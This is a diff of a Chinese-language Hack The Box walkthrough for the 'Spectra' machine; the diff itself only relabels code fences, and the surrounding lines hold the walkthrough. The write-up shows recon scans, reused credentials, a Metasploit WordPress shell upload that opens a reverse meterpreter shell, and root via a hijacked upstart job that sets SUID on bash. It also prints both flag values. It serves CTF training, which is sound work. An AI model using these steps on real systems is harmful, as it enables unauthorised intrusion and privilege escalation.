@@ -10,7 +10,7 @@ Operating System: Other
 
 ## nmap 信息搜集
 
-```shell title="sudo nmap -A --min-rate=5000 -T5 -p- 10.10.10.229"
+```bash title="sudo nmap -A --min-rate=5000 -T5 -p- 10.10.10.229"
 PORT     STATE SERVICE    VERSION
 22/tcp   open  tcpwrapped
 | ssh-hostkey:
@@ -25,7 +25,7 @@ PORT     STATE SERVICE    VERSION
 
 尝试访问
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ http get http://10.10.10.229/
 HTTP/1.1 200 OK
@@ -60,7 +60,7 @@ Server: nginx/1.17.4
 
 一眼 Wordpress 框架，上扫描器看看
 
-```shell title="wpscan --url http://spectra.htb/main/"
+```bash title="wpscan --url http://spectra.htb/main/"
 [+] Headers
  | Interesting Entries:
  |  - Server: nginx/1.17.4
@@ -128,7 +128,7 @@ Server: nginx/1.17.4
 
 尝试目录扫描
 
-```shell title="dirsearch -u http://spectra.htb/"
+```bash title="dirsearch -u http://spectra.htb/"
 [23:41:51] Starting:
 [23:44:01] 301 -  169B  - /main  ->  http://spectra.htb/main/
 [23:44:09] 200 -   25KB - /main/
@@ -249,7 +249,7 @@ password: devteam01
 
 确定凭据没有问题的话，就可以直接使用 Metasploit 进行攻击
 
-```shell
+```bash
 msf6 > use exploit/unix/webapp/wp_admin_shell_upload
 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME administrator
@@ -284,7 +284,7 @@ Meterpreter : php/linux
 
 ## User - nginx
 
-```shell
+```bash
 meterpreter > shell
 Process 4661 created.
 Channel 1 created.
@@ -309,7 +309,7 @@ SummerHereWeCome!!
 
 ## User - katie
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs katie@10.10.10.229
 [15:02:06] Welcome to pwncat 🐈!
@@ -323,7 +323,7 @@ katie
 
 ### flag - user
 
-```shell
+```bash
 (remote) katie@spectra:/home/katie$ cat user.txt
 e89d27fe195e9114ffa72ba8913a6130
 ```
@@ -337,7 +337,7 @@ User katie may run the following commands on spectra:
 
 ### initctl 利用
 
-```shell
+```bash
 (remote) katie@spectra:/home/katie$ sudo /sbin/initctl list
 crash-reporter-early-init stop/waiting
 ......
@@ -385,7 +385,7 @@ console.log('Server running at http://127.0.0.1:8081/');
 
 两个文件都是可控的，在这里选择控制服务配置文件
 
-```shell
+```bash
 (remote) katie@spectra:/home/katie$ vim /etc/init/test.conf
 ```
 
@@ -405,7 +405,7 @@ end script
 
 然后启动服务
 
-```shell
+```bash
 (remote) katie@spectra:/home/katie$ sudo /sbin/initctl start test
 test start/running, process 5172
 (remote) katie@spectra:/home/katie$ ls -lh /bin/bash
@@ -416,7 +416,7 @@ test start/running, process 5172
 
 ## User - root
 
-```shell
+```bash
 (remote) katie@spectra:/home/katie$ bash -p
 (remote) root@spectra:/home/katie# whoami
 root
@@ -424,7 +424,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 (remote) root@spectra:/root# cat root.txt
 d44519713b889d5e1f9e536d0c6df2fc
 ```
